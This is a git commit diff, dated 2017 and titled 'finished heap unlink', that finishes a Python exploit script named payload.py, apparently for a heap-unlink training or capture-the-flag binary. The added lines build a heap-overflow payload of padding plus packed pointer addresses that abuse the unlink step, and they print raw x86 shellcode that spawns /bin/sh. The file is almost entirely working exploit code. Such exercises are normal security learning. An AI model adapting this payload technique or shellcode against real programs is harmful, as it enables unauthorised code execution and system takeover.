9f9eb4a19e06b551119a7260ed69cec8376c5405
Chirath02 <chirath.02@gmail.com>
2017-04-25 18:13:01 +0530

    finished heap unlink

--- HeapUnlink/payload.py
+++ HeapUnlink/payload.py
@@ -2,15 +2,11 @@ import struct
 
 sc_addr = 0x804a060
 
-saved_rip = 
+func_pointer = 0x804a02c  # func - 12
 
-func_pointer = 0x804a020  # func - 12
+payload = 'A' * 32 +  struct.pack('<i', func_pointer - 40) + struct.pack('<i', sc_addr) 
 
-payload = 'A' * 32 +  struct.pack('<i', sc_addr - 4) + struct.pack('<i', sc_addr + 4) 
-
-sc = struct.pack('<i', saved_rip) + struct.pack('<i', sc_addr)
-
-print sc
+print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
 
 print "abcd"
 
